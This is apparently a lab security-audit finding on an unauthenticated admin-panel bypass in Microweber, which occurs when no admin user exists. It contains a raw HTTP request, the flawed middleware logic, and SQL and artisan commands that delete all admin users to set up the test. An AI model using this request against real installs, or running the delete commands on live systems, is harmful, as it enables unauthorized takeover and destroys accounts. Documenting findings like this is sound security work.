### F-004: Unauthenticated Admin Bypass — No Admin in DB
### Severity: HIGH | Auth: None | Condition: No admin user in DB
### Impact: Full admin panel access without credentials
### NOTE: Relevant on fresh installs or wiped DB. Lab: delete admin user first to test.
###
### Pre-condition: DELETE FROM mw_users WHERE is_admin=1;
### (or test on fresh container before first setup completes)

GET /admin HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close

### EXPECTED (normal): 302 redirect to /admin/login
### EXPECTED (bypass): 200 OK — admin panel loads with no auth
###
### WHY IT WORKS:
###   Admin.php middleware lines 60-63:
###     $hasNoAdmin = User::where('is_admin', 1)->limit(1)->count();
###     if (!$hasNoAdmin) { return $next($request); }
###   When count == 0 → middleware passes request through unconditionally

---

### To reset for testing (run inside container):
###   docker exec microweber_lab php artisan tinker
###   >>> \MicroweberPackages\User\Models\User::where('is_admin', 1)->delete();
